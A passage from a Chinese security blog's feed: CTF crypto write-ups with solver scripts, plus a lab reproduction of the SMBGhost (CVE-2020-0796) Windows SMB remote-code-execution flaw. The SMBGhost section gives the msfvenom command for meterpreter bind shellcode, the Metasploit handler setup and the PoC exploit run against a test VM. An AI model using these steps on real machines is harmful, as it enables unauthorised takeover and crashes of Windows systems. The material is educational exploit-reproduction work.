class="token punctuation">(</span><span class="token string">'l'</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> si<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'29'</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>				<span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'i ='</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token string">'\tj ='</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span></pre></td></tr></table></figure><p>满足 <code>encrypt('f', i, si)=='1c'</code>  的结果：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>i <span class="token operator">=</span> <span class="token number">52</span> 	j <span class="token operator">=</span> <span class="token constant">D</span></pre></td></tr><tr><td data-num="2"></td><td><pre>i <span class="token operator">=</span> <span class="token number">57</span> 	j <span class="token operator">=</span> <span class="token constant">F</span></pre></td></tr><tr><td data-num="3"></td><td><pre>i <span class="token operator">=</span> <span class="token number">62</span> 	j <span class="token operator">=</span> <span class="token constant">H</span></pre></td></tr><tr><td data-num="4"></td><td><pre>i <span class="token operator">=</span> <span class="token number">67</span> 	j <span class="token operator">=</span> <span class="token constant">J</span></pre></td></tr><tr><td data-num="5"></td><td><pre>i <span class="token operator">=</span> <span class="token number">72</span> 	j <span class="token operator">=</span> <span class="token constant">L</span></pre></td></tr><tr><td data-num="6"></td><td><pre>i <span class="token operator">=</span> <span class="token number">77</span> 	j <span class="token operator">=</span> <span class="token constant">N</span></pre></td></tr><tr><td data-num="7"></td><td><pre>i <span class="token operator">=</span> <span class="token number">82</span> 	j <span class="token operator">=</span> <span class="token constant">P</span></pre></td></tr><tr><td data-num="8"></td><td><pre>i <span class="token operator">=</span> <span class="token number">87</span> 	j <span class="token operator">=</span> <span class="token constant">R</span></pre></td></tr><tr><td data-num="9"></td><td><pre>i <span class="token operator">=</span> <span class="token number">92</span> 	j <span class="token operator">=</span> <span class="token constant">T</span></pre></td></tr><tr><td data-num="10"></td><td><pre>i <span class="token operator">=</span> <span class="token number">97</span> 	j <span class="token operator">=</span> <span class="token constant">V</span></pre></td></tr></table></figure><p>满足 <code>encrypt('l', i, si)=='29'</code>  的结果：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>i <span class="token operator">=</span> <span class="token number">54</span> 	j <span class="token operator">=</span> <span class="token class-name">A</span></pre></td></tr><tr><td data-num="2"></td><td><pre>i <span class="token operator">=</span> <span class="token number">55</span> 	j <span class="token operator">=</span> <span class="token class-name">U</span></pre></td></tr><tr><td data-num="3"></td><td><pre>i <span class="token operator">=</span> <span class="token number">61</span> 	j <span class="token operator">=</span> <span class="token class-name">M</span></pre></td></tr><tr><td data-num="4"></td><td><pre>i <span class="token operator">=</span> <span class="token number">67</span> 	j <span class="token operator">=</span> <span class="token class-name">E</span></pre></td></tr><tr><td data-num="5"></td><td><pre>i <span class="token operator">=</span> <span class="token number">68</span> 	j <span class="token operator">=</span> <span class="token class-name">Y</span></pre></td></tr><tr><td data-num="6"></td><td><pre>i <span class="token operator">=</span> <span class="token number">74</span> 	j <span class="token operator">=</span> <span class="token class-name">Q</span></pre></td></tr><tr><td data-num="7"></td><td><pre>i <span class="token operator">=</span> <span class="token number">80</span> 	j <span class="token operator">=</span> <span class="token class-name">I</span></pre></td></tr><tr><td data-num="8"></td><td><pre>i <span class="token operator">=</span> <span class="token number">86</span> 	j <span class="token operator">=</span> <span class="token class-name">A</span></pre></td></tr><tr><td data-num="9"></td><td><pre>i <span class="token operator">=</span> <span class="token number">87</span> 	j <span class="token operator">=</span> <span class="token class-name">U</span></pre></td></tr><tr><td data-num="10"></td><td><pre>i <span class="token operator">=</span> <span class="token number">93</span> 	j <span class="token operator">=</span> <span class="token class-name">M</span></pre></td></tr><tr><td data-num="11"></td><td><pre>i <span class="token operator">=</span> <span class="token number">99</span> 	j <span class="token operator">=</span> <span class="token class-name">E</span></pre></td></tr></table></figure><p>相同的 i 只有 67，说明随机数 <code>a=67</code> 。</p>
<p>然后拿着 a 去继续爆 salt 的后两位：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> si<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'56'</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>	<span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'j ='</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">if</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> si<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'66'</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'j ='</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span></pre></td></tr></table></figure><p>最终得出 <code>salt='JESQ'</code> 。<br />
知道了随机出 a 和 salt，这道题就出来了：</p>
<p>exp：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>from random <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>from string <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre>from itertools <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>def <span class="token function">decrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">,</span> si<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	c<span class="token operator">=</span><span class="token string">""</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>		c<span class="token operator">+=</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> a <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span>si<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">zfill</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token keyword">return</span> c</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    a<span class="token operator">=</span><span class="token number">67</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    salt <span class="token operator">=</span> <span class="token string">'JESQ'</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    si <span class="token operator">=</span> <span class="token function">cycle</span><span class="token punctuation">(</span>salt<span class="token punctuation">.</span><span class="token function">lower</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    c <span class="token operator">=</span> <span class="token string">'3472184e657e50561c481f5c1c4e1938163e154431015e13062c1b073d4e3a444f4a5c5c7a071919167b034e1c29566647600c4e1c2956661b6c1f50622f0016317e563546202a'</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    q<span class="token operator">=</span><span class="token function">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token comment">//2</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    s<span class="token operator">=</span><span class="token string">''</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        b<span class="token operator">=</span>c<span class="token punctuation">[</span><span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        c<span class="token operator">=</span>c<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        sm<span class="token operator">=</span><span class="token function">next</span><span class="token punctuation">(</span>si<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            m<span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            c1<span class="token operator">=</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> a <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span>sm<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">zfill</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token function">#print</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>c1<span class="token punctuation">,</span><span class="token function">int</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>base<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">int</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>base<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">int</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>base<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">int</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>base<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                s<span class="token operator">+=</span>m</pre></td></tr><tr><td data-num="28"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token function">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>now_is_7fad9fcb<span class="token operator">-</span>d361<span class="token operator">-</span><span class="token number">4964</span><span class="token operator">-</span>821c<span class="token operator">-</span>177c906b8d20_flag_is_flag<span class="token punctuation">&#123;</span><span class="token function">md5</span><span class="token punctuation">(</span>now<span class="token operator">-</span>salt<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>根据要求<strong> md5 加密</strong> <code>now-salt</code>  即可得到 flag。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>now<span class="token operator">-</span>salt<span class="token operator">:</span>7fad9fcb<span class="token operator">-</span>d361<span class="token operator">-</span><span class="token number">4964</span><span class="token operator">-</span>821c<span class="token operator">-</span>177c906b8d20<span class="token operator">-</span><span class="token constant">JESQ</span></pre></td></tr></table></figure><p>最终 flag 为：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>1efce62ee0a96e39149e2179db1dd04c<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpYWhpYWNoYW5nL2FydGljbGUvZGV0YWlscy8xMDg4MDAyMTA=">参考链接</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0hpdGFjb24vYXJ0aWNsZS9kZXRhaWxzLzEwNjMwOTAwMA==">DASCTF 密码第一题</span></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow 月饼杯crypto1_中秋月wp</title>
    <url>/article/b5c81d74.html</url>
    <content><![CDATA[<p>下载附件得到内容</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>fsskryenvkm<span class="token operator">~</span>jl<span class="token punctuation">&#123;</span>ejs<span class="token punctuation">&#125;</span>jwflzsnpgmifq</pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-0796 (SMBv3远程代码执行) Windows-10</title>
    <url>/article/39bc4a94.html</url>
    <content><![CDATA[<h2 id="cve-2020-0796-简介"><a class="anchor" href="#cve-2020-0796-简介">#</a> CVE-2020-0796 - 简介</h2>
<h3 id="漏洞名称"><a class="anchor" href="#漏洞名称">#</a> 【漏洞名称】</h3>
<p><code>SMB</code>  远程代码执行漏洞（ <code>CVE-2020-0796</code> ），有安全研究者取名 “ <code>SMBGhost</code> ”。</p>
<h3 id="漏洞类型"><a class="anchor" href="#漏洞类型">#</a> 【漏洞类型】</h3>
<p>远程代码执行</p>
<h3 id="漏洞等级"><a class="anchor" href="#漏洞等级">#</a> 【漏洞等级】</h3>
<p>高危</p>
<h3 id="漏洞描述"><a class="anchor" href="#漏洞描述">#</a> 【漏洞描述】</h3>
<p>微软 3 月 11 日发布 3 月例行更新，其中并未公布编号为 <code>CVE-2020-0796</code>  的高危漏洞资料，但该漏洞却最为引人注目。次日晚（2020 年 3 月 12 日）微软正式发布 <code>CVE-2020-0796</code>  高危漏洞补丁。</p>
<p><code>SMB 3.1.1</code>  协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。</p>
<p>攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。</p>
<p>该漏洞的后果十分接近永恒之蓝系列，都利用 <code>Windows SMB</code>  漏洞远程攻击获取系统最高权限， <code>WannaCry</code>  勒索蠕虫就是利用永恒之蓝系列漏洞攻击工具制造的大灾难。除了直接攻击 <code>SMB</code>  服务端造成 <code>RCE</code>  外，该漏洞得亮点在于对 <code>SMB</code>  客户端的攻击，攻击者可以构造特定的网页，压缩包，共享目录， <code>OFFICE</code>  文档等多种方式触发漏洞进行攻击。</p>
<p>该漏洞并未出现在微软 3 月的例行更新列表，有国外安全厂商意外发布了有关该漏洞存在的消息，随后引发行业关注。</p>
<h3 id="漏洞版本"><a class="anchor" href="#漏洞版本">#</a> 【漏洞版本】</h3>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>漏洞不影响win7，漏洞影响Windows <span class="token number">10</span> <span class="token number">1903</span>之后的各个<span class="token number">32</span>位、<span class="token number">64</span>位版Windows，包括家用版、专业版、企业版、教育版。</pre></td></tr><tr><td data-num="2"></td><td><pre>Windows <span class="token number">10</span> Version <span class="token number">1903</span> <span class="token keyword">for</span> <span class="token number">32</span><span class="token operator">-</span>bit Systems</pre></td></tr><tr><td data-num="3"></td><td><pre>Windows <span class="token number">10</span> Version <span class="token number">1903</span> <span class="token keyword">for</span> x64<span class="token operator">-</span>based Systems</pre></td></tr><tr><td data-num="4"></td><td><pre>Windows <span class="token number">10</span> Version <span class="token number">1903</span> <span class="token keyword">for</span> <span class="token constant">ARM64</span><span class="token operator">-</span>based Systems</pre></td></tr><tr><td data-num="5"></td><td><pre>Windows Server<span class="token punctuation">,</span> Version <span class="token number">1903</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>Windows <span class="token number">10</span> Version <span class="token number">1909</span> <span class="token keyword">for</span> <span class="token number">32</span><span class="token operator">-</span>bit Systems</pre></td></tr><tr><td data-num="7"></td><td><pre>Windows <span class="token number">10</span> Version <span class="token number">1909</span> <span class="token keyword">for</span> x64<span class="token operator">-</span>based Systems</pre></td></tr><tr><td data-num="8"></td><td><pre>Windows <span class="token number">10</span> Version <span class="token number">1909</span> <span class="token keyword">for</span> <span class="token constant">ARM64</span><span class="token operator">-</span>based Systems</pre></td></tr><tr><td data-num="9"></td><td><pre>Windows Server<span class="token punctuation">,</span> Version <span class="token number">1909</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="漏洞复现"><a class="anchor" href="#漏洞复现">#</a> 漏洞复现</h3>
<p><code>RCE</code>  到  <code>Metasploit</code></p>
<p>使用迅雷下载  <code>win-10</code>  的  <code>iso</code>  镜像并安装系统：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Win <span class="token number">10</span><span class="token operator">-</span><span class="token number">1903</span> 迅雷下载 ：ed2k<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token operator">|</span>file<span class="token operator">|</span>cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c<span class="token punctuation">.</span>iso<span class="token operator">|</span><span class="token number">4815527936</span><span class="token operator">|</span>47D4C57E638DF8BF74C59261E2CE702D<span class="token operator">|</span></pre></td></tr></table></figure><p>首先查了一下补丁情况，发现没有 ： <code>KB4551762</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211014195125424-818737904.png" alt="img" /></p>
<p>通过齐安信的漏洞检测脚本发现存在漏洞：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>dl<span class="token punctuation">.</span>qianxin<span class="token punctuation">.</span>com<span class="token operator">/</span>skylar6<span class="token operator">/</span><span class="token constant">CVE</span><span class="token operator">-</span><span class="token number">2020</span><span class="token operator">-</span><span class="token number">0796</span><span class="token operator">-</span>Scanner<span class="token punctuation">.</span>zip</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token constant">C</span><span class="token operator">:</span>\Users\<span class="token constant">CVE</span><span class="token operator">-</span><span class="token number">2020</span><span class="token operator">-</span><span class="token number">0796</span>\Desktop\<span class="token constant">CVE</span><span class="token operator">-</span><span class="token number">2020</span><span class="token operator">-</span><span class="token number">0796</span><span class="token operator">-</span>Scanner<span class="token operator">></span><span class="token constant">CVE</span><span class="token operator">-</span><span class="token number">2020</span><span class="token operator">-</span><span class="token number">0796</span><span class="token operator">-</span>Scanner<span class="token punctuation">.</span>exe</pre></td></tr><tr><td data-num="5"></td><td><pre>请输入目标<span class="token constant">IP</span>或<span class="token constant">IP</span><span class="token literal-property property">范围</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">192.168</span><span class="token number">.146</span><span class="token number">.156</span></pre></td></tr><tr><td data-num="7"></td><td><pre>本漏洞扫描工具仅限于网络安全管理员发现本组织的问题系统使用，依据网络安全法，任何攻击为目的对非授权系统的非法使用所导致的后果自负。</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 目标 <span class="token punctuation">[</span><span class="token number">192.168</span><span class="token number">.146</span><span class="token number">.156</span><span class="token punctuation">]</span> 已支持<span class="token constant">SMB</span> v3<span class="token punctuation">.</span><span class="token number">1.1</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> 警告！目标 <span class="token punctuation">[</span><span class="token number">192.168</span><span class="token number">.146</span><span class="token number">.156</span><span class="token punctuation">]</span> 仍存在漏洞风险</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211014195155529-610640518.png" alt="img" /></p>
<p>通过 MSF 生成 shellcode：（用正向）</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcp lport<span class="token operator">=</span><span class="token number">9999</span> <span class="token operator">-</span>f py <span class="token operator">-</span>o shellcode<span class="token punctuation">.</span>txt</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211014195212009-1729536597.png" alt="img" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211014195227188-776956928.png" alt="img" /></p>
<p>然后我们通过下载 exp 脚本：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>chompie1337<span class="token operator">/</span>SMBGhost_RCE_PoC<span class="token punctuation">.</span>git</pre></td></tr></table></figure><p>把刚刚  <code>MSF</code>  生成的  <code>shellcode</code>  里的  <code>buf</code>  替换成  <code>USER_PAYLOAD</code> ：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211014195242375-2005450108.png" alt="img" /></p>
<p>这个时候 MSF 就可以启动监听了：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msfconsole</pre></td></tr><tr><td data-num="2"></td><td><pre>use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">set</span> payload windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcpset </pre></td></tr><tr><td data-num="4"></td><td><pre>lport 9999set rhost <span class="token number">192.168</span><span class="token number">.146</span><span class="token number">.156</span></pre></td></tr><tr><td data-num="5"></td><td><pre>exploit</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211014195304113-1438216520.png" alt="img" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211014195314705-1164233527.png" alt="img" /></p>
<p>然后运行 Python 脚本反弹会话：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>python3 exploit<span class="token punctuation">.</span>py <span class="token operator">-</span>ip <span class="token number">192.168</span><span class="token number">.146</span><span class="token number">.156</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211014195331555-83256380.png" alt="img" /></p>
<p>有效显示：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211014195345412-862054042.png" alt="img" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211014195356644-844751591.png" alt="img" /></p>
<p>注意！！！</p>
<p>有很大的几率会导致目标系统蓝屏！<br />
<img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211014195411737-876590080.png" alt="img" /></p>
<p>emo，小编成功蓝屏 2333!</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow月饼杯Crypto3_多少离杯WP</title>
    <url>/article/a7cc6afa.html</url>
    <content><![CDATA[<p><span class="exturl" data-url="aHR0cHM6Ly9jdGYuc2hvdy9jaGFsbGVuZ2VzI2NyeXB0bzNfJUU1JUE0JTlBJUU1JUIwJTkxJUU3JUE2JUJCJUU2JTgwJTgwLTQ4NQ==">题目链接</span></p>
<p><strong>多少离怀起清夜，人间重望一回圆。</strong></p>
<p><code>Weird Γ(x).py</code> :</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre># <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token operator">:</span>utf<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="2"></td><td><pre>#Author<span class="token operator">:</span> Lazzaro</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>from Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span>isPrime</pre></td></tr><tr><td data-num="5"></td><td><pre>from math <span class="token keyword">import</span> gamma</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>def <span class="token function">nextPrime</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    n <span class="token operator">+=</span> <span class="token number">2</span> <span class="token keyword">if</span> n <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">while</span> not <span class="token function">isPrime</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        n <span class="token operator">+=</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">return</span> n</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>def <span class="token function">getNewPrime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token constant">A</span> <span class="token operator">=</span> <span class="token function">getPrime</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token constant">B</span> <span class="token operator">=</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span><span class="token constant">A</span> <span class="token operator">-</span> random<span class="token punctuation">.</span><span class="token function">randint</span><span class="token punctuation">(</span><span class="token number">1e4</span><span class="token punctuation">,</span><span class="token number">1e5</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span><span class="token function">gamma</span><span class="token punctuation">(</span><span class="token constant">B</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token constant">A</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	</pre></td></tr><tr><td data-num="19"></td><td><pre>p <span class="token operator">=</span> <span class="token function">getNewPrime</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>q <span class="token operator">=</span> <span class="token function">getNewPrime</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>r <span class="token operator">=</span> <span class="token function">getNewPrime</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>n <span class="token operator">=</span> p <span class="token operator">*</span> q <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">*</span> r <span class="token operator">**</span> <span class="token number">3</span></pre></td></tr><tr><td data-num="23"></td><td><pre>e <span class="token operator">=</span> <span class="token number">0x10001</span></pre></td></tr><tr><td data-num="24"></td><td><pre>c <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>#pA<span class="token operator">=</span><span class="token number">6814157460586876042804041951834304833424062437744287469257313954502540797027261340622077218188033865281590529907571701131297782609357118357982463723982789</span></pre></td></tr><tr><td data-num="27"></td><td><pre>#pB<span class="token operator">=</span><span class="token 